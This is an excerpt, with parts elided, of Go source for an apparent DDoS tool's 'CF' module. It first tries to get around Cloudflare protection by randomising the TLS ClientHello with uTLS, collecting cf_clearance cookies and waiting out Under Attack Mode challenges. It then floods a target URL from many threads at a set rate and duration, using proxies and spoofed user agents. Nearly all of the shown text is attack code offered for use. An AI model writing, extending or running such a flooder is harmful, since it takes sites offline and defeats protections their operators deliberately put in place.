...
// CF logic:
// 1. Bypass Phase: Attempt to connect and get CF cookies (cf_clearance, etc.)
//    - Uses UTLS to randomize Hello to avoid trivial blocking.
//    - Follows redirects and collects cookies.
// 2. Flood Phase: Use the acquired cookies to flood the target.
...
type CFSolver struct {
	...
	Proxy      string
	Client     *http.Client
	rt         *http.Transport // Standard transport for now, upgraded to UTLS in dialer if needed
	utlsClient *utls.UConn
}

func CF(ctx context.Context, target string, duration int, rps int, threads int, proxyFile string) {
	parsedURL, err := url.Parse(target)
	if err != nil {
		fmt.Println("[CF] Error parsing URL:", err)
		return
	}

	fmt.Printf("[CF] Starting bypass analysis on %s\n", target)

	// In a real scenario, we would have a pool of solvers.
	// For this port, we create one "template" solver to get cookies, then share them.
	// Or each thread can solve for itself (better redundancy).

	// Let's spawn threads where each thread attempts to maintain its own session (closer to accurate browser behavior).
	...
	for i := 0; i < threads; i++ {
		...
		go func(id int) {
			...
			// Each thread behaves like a browser
			// 1. Init
			ua := getUserAgent()

			// 2. Bypass/Connect loop
			// We try to get a "clean" session
			cookies, err := attemptBypass(parsedURL, ua)
			if err != nil {
				// Failed to bypass, naive flood fallback or retry
				// fmt.Printf("[Thread %d] Bypass failed: %v, retrying...\n", id, err)
			}
			...
			client := &http.Client{
				...
				Transport: &http.Transport{
					TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // Fast standard TLS for speed after bypass?
					// Ideally we continue using UTLS to maintain the session identity
	...
	<-ctx.Done()
	wg.Wait()
	fmt.Println("[CF] Attack finished")
}

// dialUTLS creates a connection with a randomized ClientHello ID
...
func attemptBypass(target *url.URL, ua string) ([]*http.Cookie, error) {
	// 1. First Visit
	// We use a custom RoundTripper that uses UTLS
	tr := &http.Transport{
		DialTLS: func(network, addr string) (net.Conn, error) {
			return dialUTLS(network, addr)
		},
	...
	// 2. Check for protection challenges
	// 503 is typical for UAM (Under Attack Mode)
	// 403 can be WAF
	if resp.StatusCode == 503 || resp.StatusCode == 403 {
		// Logic to "wait" or "solve".
		// Real solving needs JS. Here we mimic the Cloudscraper 'sleep and retry' tactic for UAM.
		// Cloudflare UAM usually reloads after 5 seconds.

		// fmt.Println("[CF] Detected challenge, waiting...")
		time.Sleep(5500 * time.Millisecond)

		// Retry with the cookies we (hopefully) got from the 503 page?
		// Note: CF sets cookies like `__cf_bm` or `cf_clearance` on the refresh.
		// Standard net/http client handles cookies in its Jar if we set one.
		// For this snippet, we extract manually for demonstration.
